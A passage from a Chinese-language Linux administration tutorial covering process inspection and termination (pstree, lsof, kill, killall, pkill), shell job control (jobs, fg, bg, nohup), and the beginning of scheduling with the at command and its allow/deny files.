命令常用选项以及各自的含义。</p><table><thead><tr><th>选项</th><th>含义</th></tr></thead><tbody><tr><td>-a</td><td>显示启动每个进程对应的完整指令，包括启动进程的路径、参数等。</td></tr><tr><td>-c</td><td>不使用精简法显示进程信息，即显示的进程中包含子进程和父进程。</td></tr><tr><td>-n</td><td>根据进程 PID 号来排序输出，默认是以程序名排序输出的。</td></tr><tr><td>-p</td><td>显示进程的 PID。</td></tr><tr><td>-u</td><td>显示进程对应的用户名称。</td></tr></tbody></table><p>需要注意的是，在使用 pstree 命令时，如果不指定进程的 PID 号，也不指定用户名称，则会以 init 进程为根进程，显示系统中所有程序和进程的信息；反之，若指定 PID 号或用户名，则将以 PID 或指定命令为根进程，显示 PID 或用户对应的所有程序和进程。</p><p>init 进程是系统启动的第一个进程，进程的 PID 是 1，也是系统中所有进程的父进程。</p><p>【例 1】</p><pre><code>[root@1ocalhost ~]# pstreeinit──┬──abrc-dump-oopa├──abrtd├──acpid...省略部分输出...├──rayslogd───3*[{rsyslogrd}]\#有3个rsyslogd进程存在├──sshd───sshd───bash───pstree\#Pstree命令进程是在远程连接中被执行的├──udevd───2*[udevd]└──xinecd</code></pre><p>【例 2】如果想知道某个用户都启动了哪些进程，使用 pstree 命令可以很容易实现，以 mysql 用户为例：</p><p>[root@1ocalhost ~]# pstree mysql<br>mysqid—6*[{mysqid}]</p><p>此输出结果显示了 mysql 用户对应的进程为 mysqid，并且 mysqid 进程拥有 5 个子进程（外加 1 个父进程，共计 6 个进程）。</p><h4 id="1-4-4-lsof命令：列出进程调用或打开的文件信息"><a href="#1-4-4-lsof命令：列出进程调用或打开的文件信息" class="headerlink" title="1.4.4    lsof命令：列出进程调用或打开的文件信息"></a>1.4.4    lsof命令：列出进程调用或打开的文件信息</h4><p>通过 ps 命令可以查询到系统中所有的进程，那么，是否可以进一步知道这个进程到底在调用哪些文件吗？当然可以，使用 lsof 命令即可。</p><p>lsof 命令，“list opened files”的缩写，直译过来，就是列举系统中已经被打开的文件。通过 lsof 命令，我们就可以根据文件找到对应的进程信息，也可以根据进程信息找到进程打开的文件。</p><p>lsof 命令的基本格式如下：</p><pre><code>[root@localhost ~]# lsof [选项]</code></pre><p>此命令常用的选项及功能，如表 1 所示。</p><table><thead><tr><th>选项</th><th>功能</th></tr></thead><tbody><tr><td>-c 字符串</td><td>只列出以字符串开头的进程打开的文件。</td></tr><tr><td>+d 目录名</td><td>列出某个目录中所有被进程调用的文件。</td></tr><tr><td>-u 用户名</td><td>只列出某个用户的进程打开的文件。</td></tr><tr><td>-p pid</td><td>列出某个 PID 进程打开的文件。</td></tr></tbody></table><p>【例 1】</p><pre><code>[root@localhost ~]# lsof | more\#查询系统中所有进程调用的文件COMMAND PID USER FD  TYPE DEVICE SIZE/OFF NODE NAMEinit        1   root  cwd DIR  8，3    4096    2      /init        1   root  rtd  DIR  8，3    4096    2      /init        1   root  txt   REG  8，3    145180  130874 /sbin/initinit        1   root  mem REG  8，3    142472  665291 /lib/ld-2.12.soinit        1   root  mem REG  8，3    58704   655087 /lib/libnss_files-2.12.so…省略部分输出…</code></pre><p>这个命令的输出非常多。它会按照 PID，从 1 号进程开始列出系统中所有的进程正在调用的文件名。</p><p>【例 2】lsof 命令也可以反过来查询某个文件被哪个进程调用。这个例子就查询到 /sbin/init 文件是被 init 进程调用的。</p><pre><code>[root@localhost ~]# lsof /sbin/init\#查询某个文件被哪个进程调用COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE  NAMEinit        1   root  txt REG  8，3   145180   130874  /sbin/init</code></pre><p>【例 3】使用“+d”选项可以搜索某个目录下所有的文件，查看到底哪个文件被哪个进程调用了。</p><pre><code>[root@localhost ~]# lsof +d /usr/lib\#查询某个目录下所有的文件是被哪些进程调用的COMMAND PID  USER  FD   TYPE DEVICE SIZE/OFF  NODE  NAMErpc.idmap   1196 root   mem REG 8，3    26400    279930  /usr/lib/libnfsidmap.so.0.3.0rpc.idmap   1196 root   mem REG 8，3    108948   276696  /usr/lib/libevent-1.4.so.2.1.3avahi-dae   1240 avahi  mem REG 8，3    49124    271310  /usr/lib/libavahi-common.so.3.5.1avahi-dae   1240 avahi  mem REG 8，3    23904    283188  /usr/lib/libdaemon.so.0.5.0avahi-dae   1240 avahi  mem REG 8，3    227212   268396  /usr/lib/libavahi-core.so.6.0.1avahi-dae   1241 avahi  mem REG 8，3    49124    271310  /usr/lib/libavahi-common.so.3.5.1avahi-dae   1241 avahi  mem REG 8，3    23904    283188  /usr/lib/libdaemon.so.0.5.0avahi-dae   1241 avahi  mem REG 8，3    227212   268396  /usr/lib/libavahi-core.so.6.0.1cupsd      1251 root   mem REG 8，3    69564    270210  /usr/lib/libtasn1.so.3.1.6</code></pre><p>【例 4】使用“-c”选项可以查询以某个字符串开头的进程调用的所有文件，比如执行“lsof-c httpd”命令就会查询出以 httpd 开头的进程调用的所有文件。</p><pre><code>[root@localhost ~]# lsof -c httpd\#查看以httpd开头的进程调用了哪些文件COMMAND PID  USER  FD  TYPE  DEVICE SIZE/OFF NODE  NAMEhttpd      4689 root   cwd DIR   8，3    4096    2      /httpd      4689 root   rtd  DIR   8，3    4096    2      /httpd      4689 root   txt   REG  8，3    1797559 2855   /usr/local/apache2/bin/httpdhttpd      4689 root   mem REG  8，3    302300  665303 /lib/libfreebl3.sohttpd      4689 root   mem REG  8，3    58704   655087 /lib/libnss_files-2.12.shttpd      4689 root   mem REG  8，3    142472  665291 /lib/ld-2.12.sohttpd      4689 root   mem REG  8，3    1889704 665292 /lib/libc-2.12.so…省略部分输出…</code></pre><p>【例 5】当然，我们也可以按照 PID 查询进程调用的文件，比如执行“lsof -p 1”命令就可以查看 PID 为 1 的进程调用的所有文件。</p><pre><code>[root@localhost ~]# lsof -p 1\#查询PID是1的进程调用的文件COMMAND PID USER FD  TYPE DEVICE SIZE/OFF NODE NAMEinit        1   root cwd DIR  8，3   4096    2      /init        1   root rtd   DIR  8，3   4096    2      /init        1   root txt   REG  8，3   145180  130874 /sbin/initinit        1   root mem REG  8，3   142472  665291 /lib/ld-2.12.soinit        1   root mem REG  8，3   58704   655087 /lib/libnss_files-2.12.so</code></pre><p>【例 6】我们还可以查看某个用户的进程调用了哪些文件。</p><pre><code>[root@localhost ~]# lsof -u root\#按照用户名查询某个用户的进程调用的文件COMMAND PID USER FD   TYPE  DEVICE  SIZE/OFF  NODE NAMEinit        1   root  cwd  DIR   8，3    4096     2      /init        1   root  rtd   DIR   8，3    4096     2      /init        1   root  txt   REG   8，3    145180   130874 /sbin/initinit        1   root  mem REG   8，3    142472   665291 /lib/ld-2.12.soinit        1   root  mem REG   8，3    58704    655087 /lib/libnss_files-2.12.sinit        1   root  mem REG   8，3    38768    655310 /lib/libnih-dbus.so.1.0.…省略部分输出…</code></pre><h4 id="1-4-5-kill命令：终止进程"><a href="#1-4-5-kill命令：终止进程" class="headerlink" title="1.4.5    kill命令：终止进程"></a>1.4.5    kill命令：终止进程</h4><p>kill 从字面来看，就是用来杀死进程的命令，但事实上，这个或多或少带有一定的误导性。从本质上讲，kill 命令只是用来向进程发送一个信号，至于这个信号是什么，是用户指定的。</p><p>也就是说，kill 命令的执行原理是这样的，kill 命令会向操作系统内核发送一个信号（多是终止信号）和目标进程的 PID，然后系统内核根据收到的信号类型，对指定进程进行相应的操作。</p><p>kill 命令的基本格式如下：</p><pre><code>[root@localhost ~]# kill [信号] PID</code></pre><p>kill 命令是按照 PID 来确定进程的，所以 kill 命令只能识别 PID，而不能识别进程名。Linux 定义了几十种不同类型的信号，读者可以使用 kill -l 命令查看所有信号及其编号，这里仅列出几个常用的信号，如表 1 所示。</p><table><thead><tr><th>信号编号</th><th>信号名</th><th>含义</th></tr></thead><tbody><tr><td>0</td><td>EXIT</td><td>程序退出时收到该信息。</td></tr><tr><td>1</td><td>HUP</td><td>挂掉电话线或终端连接的挂起信号，这个信号也会造成某些进程在没有终止的情况下重新初始化。</td></tr><tr><td>2</td><td>INT</td><td>表示结束进程，但并不是强制性的，常用的 “Ctrl+C” 组合键发出就是一个 kill -2 的信号。</td></tr><tr><td>3</td><td>QUIT</td><td>退出。</td></tr><tr><td>9</td><td>KILL</td><td>杀死进程，即强制结束进程。</td></tr><tr><td>11</td><td>SEGV</td><td>段错误。</td></tr><tr><td>15</td><td>TERM</td><td>正常结束进程，是 kill 命令的默认信号。</td></tr></tbody></table><p>需要注意的是，表中省略了各个信号名称的前缀 SIG，也就是说，SIGTERM 和 TERM 这两种写法都对，kill 命令都可以理解。</p><p>下面，我们举几个例子来说明一下 kill 命令。</p><p>【例 1】 标准 kill 命令。</p><pre><code>[root@localhost ~】# service httpd start\#启动RPM包默认安装的apache服务[root@localhost ~]# pstree -p 丨 grep httpd | grep -v "grep"\#查看 httpd 的进程树及 PID。grep 命令査看 httpd 也会生成包含"httpd"关键字的进程，所以使用“-v”反向选择包含“grep”关键字的进程，这里使用 pstree 命令来查询进程，当然也可以使用 ps 和 top 命令|-httpd(2246)-+-httpd(2247)|  |-httpd(2248)|  |-httpd(2249)|  |-httpd(2250)|  |-httpd(2251)[root@localhost ~]# kill 2248\#杀死PID是2248的httpd进程，默认信号是15，正常停止\#如果默认信号15不能杀死进程，则可以尝试-9信号，强制杀死进程[root@localhost ~]# pstree -p | grep httpd | grep -v "grep"|-httpd(2246&gt;-+-httpd(2247)|  |-httpd(2249)|  |-httpd(2250)|  |-httpd(2251)\#PID是2248的httpd进程消失了</code></pre><p>【例 2】使用“-1”信号，让进程重启。</p><pre><code>[root@localhost ~]# kill -1 2246使用“-1 (数字1)”信号，让httpd的主进程重新启动[root@localhost ~]# pstree -p | grep httpd | grep -v "grep"|-httpd(2246)-+-httpd(2270)|  |-httpd(2271)|  |-httpd(2272)|  |-httpd(2273)|  |-httpd(2274)\#子httpd进程的PID都更换了，说明httpd进程已经重启了一次</code></pre><h4 id="1-4-6-killall命令：终止特定的一类进程"><a href="#1-4-6-killall命令：终止特定的一类进程" class="headerlink" title="1.4.6    killall命令：终止特定的一类进程"></a>1.4.6    killall命令：终止特定的一类进程</h4><p>killall 也是用于关闭进程的一个命令，但和 kill 不同的是，killall 命令不再依靠 PID 来杀死单个进程，而是通过程序的进程名来杀死一类进程，也正是由于这一点，该命令常与 ps、pstree 等命令配合使用。</p><p>killall 命令的基本格式如下：</p><p>[root@localhost ~]# killall [选项] [信号] 进程名</p><p>注意，此命令的信号类型同 kill 命令一样，因此这里不再赘述，此命令常用的选项有如下 2 个：</p><ul><li>-i：交互式，询问是否要杀死某个进程；</li><li>-I：忽略进程名的大小写；</li></ul><p>接下来，给大家举几个例子。</p><p>【例 1】杀死 httpd 进程。</p><pre><code>[root@localhost ~]# service httpd start\#启动RPM包默认安装的apache服务[root@localhost ~]# ps aux | grep "httpd" | grep -v "grep"root 1600 0.0 0.2 4520 1696? Ss 19:42 0:00 /usr/local/apache2/bin/httpd -k startdaemon 1601 0.0 0.1 4520 1188? S 19:42 0:00 /usr/local/apache2/bin/httpd -k startdaemon 1602 0.0 0.1 4520 1188? S 19:42 0:00 /usr/local/apache2/bin/httpd -k startdaemon 1603 0.0 0.1 4520 1188? S 19:42 0:00 /usr/local/apache2/bin/httpd -k startdaemon 1604 0.0 0.1 4520 1188? S 19:42 0:00 /usr/local/apache2/bin/httpd -k startdaemon 1605 0.0 0.1 4520 1188? S 19:42 0:00 /usr/local/apache2/bin/httpd -k start\#查看httpd进程[root@localhost ~]# killall httpd\#杀死所有进程名是httpd的进程[root@localhost ~]# ps aux | grep "httpd" | grep -v "grep"\#查询发现所有的httpd进程都消失了</code></pre><p>【例 2】交互式杀死 sshd 进程。</p><pre><code>[root@localhost ~]# ps aux | grep "sshd" | grep -v "grep"root 1733 0.0 0.1 8508 1008? Ss 19:47 0:00/usr/sbin/sshdroot 1735 0.1 0.5 11452 3296? Ss 19:47 0:00 sshd: root@pts/0root 1758 0.1 0.5 11452 3296? Ss 19:47 0:00 sshd: root@pts/1\#查询系统中有3个sshd进程。1733是sshd服务的进程，1735和1758是两个远程连接的进程[root@localhost ~]# killall -i sshd\#交互式杀死sshd进程杀死sshd(1733)?(y/N)n\#这个进程是sshd的服务进程，如果杀死，那么所有的sshd连接都不能登陆杀死 sshd(1735)?(y/N)n\#这是当前登录终端，不能杀死我自己吧杀死 sshd(1758)?(y/N)y\#杀死另一个sshd登陆终端</code></pre><h4 id="1-4-7-pkill命令：终止进程，按终端号踢出用户"><a href="#1-4-7-pkill命令：终止进程，按终端号踢出用户" class="headerlink" title="1.4.7    pkill命令：终止进程，按终端号踢出用户"></a>1.4.7    pkill命令：终止进程，按终端号踢出用户</h4><p>当作于管理进程时，pkill 命令和 killall 命令的用法相同，都是通过进程名杀死一类进程，该命令的基本格式如下：</p><pre><code>[root@localhost ~]# pkill [信号] 进程名</code></pre><p>表 1 罗列了此命令常用的信号及其含义。</p><table><thead><tr><th>信号编号</th><th>信号名</th><th>含义</th></tr></thead><tbody><tr><td>0</td><td>EXIT</td><td>程序退出时收到该信息。</td></tr><tr><td>1</td><td>HUP</td><td>挂掉电话线或终端连接的挂起信号，这个信号也会造成某些进程在没有终止的情况下重新初始化。</td></tr><tr><td>2</td><td>INT</td><td>表示结束进程，但并不是强制性的，常用的 “Ctrl+C” 组合键发出就是一个 kill -2 的信号。</td></tr><tr><td>3</td><td>QUIT</td><td>退出。</td></tr><tr><td>9</td><td>KILL</td><td>杀死进程，即强制结束进程。</td></tr><tr><td>11</td><td>SEGV</td><td>段错误。</td></tr><tr><td>15</td><td>TERM</td><td>正常结束进程，是 kill 命令的默认信号。</td></tr></tbody></table><p>【例 1】</p><pre><code>[root@localhost ~]# pkill -9 httpd  &lt;--按名称强制杀死 httpd 进程[root@localhost ~]# pstree -p | grep httpd  &lt;-- 查看 apache 进程，发现没有了[root@localhost ~]# service httpd start   &lt;--重新启动 apache 进程Starting httpd: httpd: Could not reliably determine the server’s fully qualified domain me, using 127.0.0.1 for ServerName[OK][root@localhost ~]# pstree -p | grep httpd &lt;-- 再次查看，apache 进程重新启动    \- httpd (11157) -+-httpd(11159)    |              |-httpd(11160)    |              |-httpd(11161)    |              |-httpd(11162)    |              |-httpd(11163)    |              |-httpd(11164)    |              |-httpd(11165)    |              |-httpd(11166)</code></pre><p><strong>pkill命令踢出登陆用户</strong></p><p>除此之外，pkill 还有一个更重要的功能，即按照终端号来踢出用户登录，此时的 pkill 命令的基本格式如下：</p><pre><code>[root@localhost ~]# pkill [-t 终端号] 进程名[-t 终端号] 选项用于按照终端号踢出用户；</code></pre><p>学习 killall 命令时，不知道大家发现没有，通过 killall 命令杀死 sshd 进程的方式来踢出用户，非常容易误杀死进程，要么会把 sshd 服务杀死，要么会把自己的登录终端杀死。</p><p>所以，不管是使用 kill 命令按照 PID 杀死登录进程，还是使用 killall 命令按照进程名杀死登录进程，都是非常容易误杀死进程的，而使用 pkill 命令则不会，举个例子：</p><pre><code>[root@localhost ~]# w#使用w命令查询本机已经登录的用户20:06:34 up 28 min, 3 users, load average: 0.00, 0.00, 0.00USER  TTY           FROM LOGIN@  IDLE  JCPU  PCPU WHATroot ttyl              -  19:47 18:52 0.01s 0.01s -bashroot pts/0 192.168.0.100  19:47 0.00s 0.09s 0.04s wroot pts/1 192.168.0.100  19:51 14:56 0.02s 0.02s -bash#当前主机已经登录了三个root用户，一个是本地终端ttyl登录，另外两个是从192.168.0.100登陆的远程登录[root@localhost ~]# pkill -9 -t pts/1#强制杀死从pts/1虚拟终端登陆的进程[root@localhost ~]# w20:09:09 up 30 min, 2 users, load average: 0.00, 0.00,0.00USER   TTY          FROM LOGIN@  IDLE  JCPU  PCPU WHATroot  ttyl             -  19:47 21:27 0.01s 0.01s -bashroot pts/0 192.168.0.100  19:47 0.00s 0.06s 0.00s w#虚拟终端pts/1的登录进程已经被杀死了</code></pre><h2 id="二、工作管理"><a href="#二、工作管理" class="headerlink" title="二、工作管理"></a>二、工作管理</h2><p><strong>工作管理指的是在单个登录终端（也就是登录的 Shell 界面）同时管理多个工作的行为。</strong>也就是说，我们登陆了一个终端，已经在执行一个操作，那么是否可以在不关闭当前操作的情况下执行其他操作呢？</p><p>当然可以，我们可以再启动一个终端，然后执行其他的操作。不过，是否可以在一个终端执行不同的操作呢？这就需要通过工作管理来实现了。</p><p>例如，我在当前终端正在 vi 一个文件，在不停止 vi 的情况下，如果我想在同一个终端执行其他的命令，就应该把 vi 命令放入后台，然后再执行其他命令。把命令放入后台，然后把命令恢复到前台，或者让命令恢复到后台执行，这些管理操作就是工作管理。</p><pre><code>后台管理有几个事项需要大家注意：1. 前台是指当前可以操控和执行命令的这个操作环境；后台是指工作可以自行运行，但是不能直接用 Ctrl+C 快捷键来中止它，只能使用 fg/bg 来调用工作。2. 当前的登录终端只能管理当前终端的工作，而不能管理其他登录终端的工作。比如 tty1 登录的终端是不能管理 tty2 终端中的工作的。3. 放入后台的命令必须可以持续运行一段时间，这样我们才能捕捉和操作它。4. 放入后台执行的命令不能和前台用户有交互或需要前台输入，否则只能放入后台暂停，而不能执行。比如 vi 命令只能放入后台暂停，而不能执行，因为 vi 命令需要前台输入信息；top 命令也不能放入后台执行，而只能放入后台暂停，因为 top 命令需要和前台交互。</code></pre><h3 id="2-1-命令放入后台"><a href="#2-1-命令放入后台" class="headerlink" title="2.1    命令放入后台"></a>2.1    命令放入后台</h3><p>Linux 命令放入后台的方法有两种，分别介绍如下。</p><h4 id="2-1-1-“命令-amp-”，把命令放入后台执行"><a href="#2-1-1-“命令-amp-”，把命令放入后台执行" class="headerlink" title="2.1.1    “命令 &amp;”，把命令放入后台执行"></a>2.1.1    “命令 &amp;”，把命令放入后台执行</h4><p>第一种把命令放入后台的方法是在命令后面加入 <code>空格 &amp;</code>。使用这种方法放入后台的命令，在后台处于执行状态。</p><p>注意，放入后台执行的命令不能与前台有交互，否则这个命令是不能在后台执行的。例如：</p><pre><code>[root@localhost ~]#find / -name install.log &amp;[1] 1920\#[工作号] 进程号\#把find命令放入后台执行，每个后台命令会被分配一个工作号。命令既然可以执行，就会有进程产生，所以也会有进程号</code></pre><p>这样，虽然 find 命令在执行，但在当前终端仍然可以执行其他操作。如果在终端上出现如下信息：</p><pre><code>[1]+ Done find / -name install.log</code></pre><p>则证明后台的这个命令已经完成了。当然，命令如果有执行结果，则也会显示到操作终端上。其中，[1] 是这个命令的工作号，”+”代表这个命令是最近一个被放入后台的。</p><h4 id="2-1-2-命令执行过程中按-Ctrl-Z-快捷键，命令在后台处于暂停状态"><a href="#2-1-2-命令执行过程中按-Ctrl-Z-快捷键，命令在后台处于暂停状态" class="headerlink" title="2.1.2    命令执行过程中按 Ctrl+Z 快捷键，命令在后台处于暂停状态"></a>2.1.2    命令执行过程中按 Ctrl+Z 快捷键，命令在后台处于暂停状态</h4><p>使用这种方法放入后台的命令，就算不和前台有交互，能在后台执行，也处于暂停状态，因为 Ctrl+Z 快捷键就是暂停的快捷键。</p><p>【例 1】</p><pre><code>[root@localhost ~]#top\#在top命令执行的过程中，按下Ctrl+Z快捷键[1]+ Stopped top\#top命令被放入后台，工作号是1，状态是暂停。而且，虽然top命令没有结束，但也能取得控制台权限</code></pre><p>【例 2】</p><pre><code>[root@localhost ~]# tar -zcf etc.tar.gz /etc\#压缩一下/etc/目录tar:从成员名中删除开头的"/"tar:从硬链接目标中删除开头的"/"^Z\#在执行过程中，按下Ctrl+Z快捷键[2]+ Stopped tar-zcf etc.tar.gz/etc\#tar命令被放入后台，工作号是2，状态是暂停</code></pre><p>每个被放入后台的命令都会被分配一个工作号。第一个被放入后台的命令，工作号是 1；第二个被放入后台的命令，工作号是 2，以此类推。</p><h3 id="2-2-jobs命令：查看当前终端放入后台的工作"><a href="#2-2-jobs命令：查看当前终端放入后台的工作" class="headerlink" title="2.2    jobs命令：查看当前终端放入后台的工作"></a>2.2    jobs命令：查看当前终端放入后台的工作</h3><p>jobs 命令可以用来查看当前终端放入后台的工作，工作管理的名字也来源于 jobs 命令。</p><p>jobs 命令的基本格式如下：</p><p>[root@localhost ~]#jobs [选项]</p><p>表 1 罗列了 jobs 命令常用的选项及含义。</p><table><thead><tr><th>选项</th><th>含义</th></tr></thead><tbody><tr><td>-l（L 的小写）</td><td>列出进程的 PID 号。</td></tr><tr><td>-n</td><td>只列出上次发出通知后改变了状态的进程。</td></tr><tr><td>-p</td><td>只列出进程的 PID 号。</td></tr><tr><td>-r</td><td>只列出运行中的进程。</td></tr><tr><td>-s</td><td>只列出已停止的进程。</td></tr></tbody></table><p>例如：</p><pre><code>[root@localhost ~]#jobs -l[1]- 2023 Stopped top[2]+ 2034 Stopped tar -zcf etc.tar.gz /etc可以看到，当前终端有两个后台工作：一个</code></pre><p>是 top 命令，工作号为 1，状态是暂停，标志是”-“；另一个是 tar 命令，工作号为 2，状态是暂停，标志是”+”。”+”号代表最近一个放入后台的工作，也是工作恢复时默认恢复的工作。”-“号代表倒数第二个放入后台的工作，而第三个以后的工作就没有”+-“标志了。</p><p>一旦当前的默认工作处理完成，则带减号的工作就会自动成为新的默认工作，换句话说，不管此时有多少正在运行的工作，任何时间都会有且仅有一个带加号的工作和一个带减号的工作。</p><h3 id="2-3-fg命令：把后台命令恢复在前台执行"><a href="#2-3-fg命令：把后台命令恢复在前台执行" class="headerlink" title="2.3     fg命令：把后台命令恢复在前台执行"></a>2.3     fg命令：把后台命令恢复在前台执行</h3><p>fg 命令用于把后台工作恢复到前台执行，该命令的基本格式如下：</p><pre><code>[root@localhost ~]#fg %工作号</code></pre><p>注意，在使用此命令时，％ 可以省略，但若将<code>% 工作号</code>全部省略，则此命令会将带有 + 号的工作恢复到前台。另外，使用此命令的过程中， % 可有可无。</p><p>例如：</p><pre><code>[root@localhost ~]#jobs[1]- Stopped top[2]+ Stopped tar-zcf etc.tar.gz/etc[root@localhost ~]# fg\#恢复“+”标志的工作，也就是tar命令[root@localhost ~]# fg ％1\#恢复1号工作，也就是top命令</code></pre><p>top 命令是不能在后台执行的，所以，如果要想中止 top 命令，要么把 top 命令恢复到前台，然后正常退出；要么找到 top 命令的 PID，使用 kill 命令杀死这个进程。</p><h3 id="2-4-bg命令：把后台暂停的工作恢复到后台执行"><a href="#2-4-bg命令：把后台暂停的工作恢复到后台执行" class="headerlink" title="2.4    bg命令：把后台暂停的工作恢复到后台执行"></a>2.4    bg命令：把后台暂停的工作恢复到后台执行</h3><p>使用 <code>Ctrl+Z</code> 快捷键的方式，可以将前台工作放入后台，但是会处于暂停状态，那么，有没有办法可以让后台工作继续在后台执行呢？答案是肯定的，这就需要用到 bg 命令。</p><p>bg 命令的基本格式如下：</p><pre><code>[root@localhost ~]# bg ％工作号</code></pre><p>和 fg 命令类似，这里的 % 可以省略。</p><p>举个例子，读者可以试着把前面章节中放入后台的两个工作恢复运行，命令如下：</p><pre><code>[root@localhost ~]# bg ％1  &lt;--- 等同于 bg 1[root@localhost ~]# bg ％2  &lt;--- 等同于 bg 2\#把两个命令恢复到后台执行[root@localhost @]# jobs[1]+ Stopped top[2]- Running tar -zcf etc.tar.gz /etc &amp;\#tar命令的状态变为了Running，但是top命令的状态还是Stopped</code></pre><p>可以看到，tar 命令确实已经在后台执行了，但是 top 命令怎么还处于暂停状态呢？原因很简单，top 命令是需要和前台交互的，所以不能在后台执行。换句话说，top 命令就是给前台用户显示系统性能的命令，如果 top 命令在后台恢复运行了，那么给谁去看结果呢？</p><h3 id="2-5-nohup命令：后台命令脱离终端运行"><a href="#2-5-nohup命令：后台命令脱离终端运行" class="headerlink" title="2.5    nohup命令：后台命令脱离终端运行"></a>2.5    nohup命令：后台命令脱离终端运行</h3><p>进程可以放到后台运行，这里的后台，其实指的是当前登陆终端的后台。这种情况下，当我们以远程管理服务器的方式，在远程终端执行后台命令，如果在命令尚未执行完毕时就退出登陆，那么这个后台命令还会继续执行吗？</p><p>当然不会，此命令的执行会被中断。这就引出一个问题，如果我们确实需要在远程终端执行某些后台命令，该如何执行呢？</p><pre><code>有以下 3 种方法：1. 把需要在后台执行的命令加入 /etc/rc.local 文件，让系统在启动时执行这个后台程序。这种方法的问题是，服务器是不能随便重启的，如果有临时后台任务，就不能执行了。2. 使用系统定时任务，让系统在指定的时间执行某个后台命令。这样放入后台的命令与终端无关，是不依赖登录终端的。3. 使用 nohup 命令。</code></pre><p>本节重点讲解 nohup 命令的用法。nohup 命令的作用就是让后台工作在离开操作终端时，也能够正确地在后台执行。此命令的基本格式如下：</p><pre><code>[root@localhost ~]# nohup [命令] &amp;</code></pre><p>注意，这里的‘&amp;’表示此命令会在终端后台工作；反之，如果没有‘&amp;’，则表示此命令会在终端前台工作。</p><p>例如：</p><pre><code>[root@localhost ~]# nohup find / -print &gt; /root/file.log &amp;[3] 2349\#使用find命令，打印/下的所有文件。放入后台执行[root@localhost ~]# nohup：忽略输入并把输出追加到"nohup.out"[root@localhost ~]# nohup：忽略输入并把输出追加到"nohup.out"\#有提示信息</code></pre><p>接下来的操作要迅速，否则 find 命令就会执行结束。然后我们可以退出登录，重新登录之后，执行“ps aux”命令，会发现 find 命令还在运行。</p><p>如果 find 命令执行太快，我们就可以写一个循环脚本，然后使用 nohup 命令执行。例如：</p><pre><code>[root@localhost ~]# vi for.sh\#！/bin/bashfor ((i=0;i&lt;=1000;i=i+1))\#循环1000次doecho 11 &gt;&gt; /root/for.log\#在for.log文件中写入11sleep 10s\#每次循环睡眠10秒done[root@localhost ~]# chmod 755 for.sh[root@localhost ~]# nohup /root/for.sh &amp;[1] 2478[root@localhost ~]# nohup：忽略输入并把输出追加到"nohup.out"\#执行脚本</code></pre><p>接下来退出登录，重新登录之后，这个脚本仍然可以通过“ps aux”命令看到。</p><h2 id="三、定时任务"><a href="#三、定时任务" class="headerlink" title="三、定时任务"></a>三、定时任务</h2><h3 id="3-1-at命令：定时执行任务"><a href="#3-1-at命令：定时执行任务" class="headerlink" title="3.1    at命令：定时执行任务"></a>3.1    at命令：定时执行任务</h3><p>要想使用 at 命令，读者需提前安装好 at 软件包，并开启 atd 服务。因此，首先来看看如何安装 at 软件包。</p><p>在 Linux 系统中，查看 at 软件包是否已安装，可以使用 rpm -q 命令，如下所示：</p><pre><code>[root@localhost ~]# rpm -q atat-3.1.13-20.el7x86_64</code></pre><p>可以看到，当前系统已经安装 at 软件包，若读者所用系统未安装，可使用如下命令进行安装：</p><pre><code>[root@localhost ~]# yum -y install at\#省略输出信息，最终出现 Complete!，证明安装成功。</code></pre><p>除此之外，at 命令要想正确执行，还需要 atd 服务的支持。atd 服务是独立的服务，启动的命令如下：</p><pre><code>[root@localhost ~]# systemctl  start  atd</code></pre><p>如果想让 atd 服务开机时自启动，则可以使用如下命令：</p><pre><code>[root@localhost ~]# systemctl enable atd</code></pre><p>安装好 at 软件包并开启 atd 服务之后，at 命令才可以正常使用，不过在此之前，我们还要学习一下 at 命令的访问控制。</p><p>访问控制指的是允许哪些用户使用 at 命令设定定时任务，或者不允许哪些用户使用 at 命令。大家可以将其想象成设定黑名单或白名单，这样更容易理解。</p><p>at 命令的访问控制是依靠 /etc/at.allow（白名单）和 /etc/at.deny（黑名单）这两个文件来实现的，具体规则如下：</p><ul><li><pre><code>- 如果系统中有 /etc/at.allow 文件，那么只有写入 /etc/at.allow 文件（白名单）中的用户可以使用 at 命令，其他用户不能使用 at 命令（注意，/etc/at.allow 文件的优先级更高，也就是说，如果同一个用户既写入 /etc/at.allow 文件，又写入 /etc/at.deny 文件，那么这个用户是可以使用 at 命令的）。- 如果系统中没有 /etc/at.allow 文件，只有 /etc/at.deny 文件，那么写入 /etc/at.deny 文件（黑名单）中的用户不能使用 at 命令，其他用户可以使用 at 命令。不过这个文件对 root 用户不生效。- 如果系统中这两个文件都不存在，那么只有 root 用户可以使用 at 命令。</code></pre></li></ul><p>系统中默认只有 /etc/at.deny 文件，而且这个文件是空的，因此，系统中所有的用户都可以使用 at 命令。不过，如果我们打算控制用户的 at 命令权限，那么只需把用户写入 /etc/at.deny 文件即可。</p><p>对于 /etc/at.allow 和 /etc/at.deny 文件的优先级，我们做一个实验来验证一下，命令如下：</p><pre><code>[root@localhost ~]# ls -l /etc/at*-rw-r--r--.1 root root 1 1月 30 2012 /etc/at.deny\#系统中默认只有at.deny文件[root@localhost ~]# echo user1 &gt;&gt; /etc/at.deny[root@localhost ~]# cat /etc/at.denyuser1\#把user1用户写入/etc/at.deny文件[root@localhost ~]# su - user1[user1@localhost ~]$ at 02：00You do not have permission to use at.\#没有权限使用at命令，切换成user1用户，这个用户已经不能执行at命令了</code></pre><pre><code>[user1@localhost ~]$ exitlogout\#返回root身份[root@localhost ~]# echo user1 &gt;&gt; /etc/at.allow[root@localhost ~]# cat /etc/at.allowuser1\#建立/etc/at.allow文件，并在文件中写入user1用户[root@localhost ~]# su - user1[user1@localhost ~]$ at 02：00at&gt;\#切换成user1用户，user1用户可以执行at命令。这时user1用户既在/etc/at.deny文件中，又在/etc/at.allow文件中，但是/etc/at.allow文件的优先级更高[user1@localhost ~]$ exitlogout\#返回root身份[root@localhost ~]# at 02：00at&gt;\#root用户虽然不在/etc/at.allow文件中，但是也能执行at命令，\#说明root用户不受这两个文件的控制</code></pre><p>这个实验说明了 /etc/at.allow 文件的优先级更高，如果 /etc/at.allow 文件存在，则 /etc/at.deny 文件失效。/etc/at.allow 文件的管理更加严格，因为只有写入这个文件的用户才能使用 at 命令，如果需要禁用 at 命令的用户较多，则可以把少数用户写入这个文件。/etc/at.deny 文件的管理较为松散，如果允许使用 at 命令的用户较多，则可以把禁用的用户写入这个文件。不过这两个文件都不能对 root 用户生效。</p><p>接下来正式介绍 at 命令。at 命令的格式非常简单，基本格式如下：</p><pre><code>[root@localhost ~] # at [选项] [时间]</code></pre><p>有关此命令常用的几个选项及各自含义如表 1 